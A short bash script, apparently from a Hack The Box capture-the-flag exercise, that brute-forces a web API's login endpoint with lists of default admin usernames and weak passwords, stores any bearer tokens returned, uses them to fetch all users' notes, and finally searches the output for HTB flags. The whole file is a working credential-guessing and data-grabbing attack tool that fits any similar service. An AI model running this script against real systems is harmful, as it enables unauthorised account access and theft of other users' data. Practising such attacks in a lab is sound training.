#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
DIR="$OUT_DIR/${IP}_${PORT}_admincreds"
mkdir -p "$DIR"
API_BASE="http://$IP:$PORT"
users=("admin@local" "admin@localhost" "admin@example.com" "admin@a.com" "admin" "root")
passwords=("admin" "password" "123456" "admin123" "qwerty" "letmein" "toor")
for u in "${users[@]}"; do
  for p in "${passwords[@]}"; do
    body=$(jq -n --arg email "$u" --arg password "$p" '{email:$email,password:$password}')
    resp=$(curl -fsS -m "$TO" --connect-timeout "$TO" -H 'Content-Type: application/json' -d "$body" "$API_BASE/api/auth/login" 2>/dev/null || true)
    echo "$u:$p:$resp" >> "$DIR/login_trials.txt"
    tok=$(printf '%s' "$resp" | jq -r '.token // empty' 2>/dev/null || true)
    if [[ -n "$tok" ]]; then
      printf '%s' "$tok" > "$DIR/token_${u//[^A-Za-z0-9]/_}.txt"
      # Try notes/all and notes?all=1
      curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $tok" "$API_BASE/api/notes?all=1" > "$DIR/${u//[^A-Za-z0-9]/_}_notes_all1.json" || true
      curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $tok" "$API_BASE/api/notes/all" > "$DIR/${u//[^A-Za-z0-9]/_}_notes_all.json" || true
    fi
    sleep 0.05
  done
done
# Search for flag
rg -n "HTB\{[^}]+\}" -S "$DIR" | sed -n '1,200p' || true
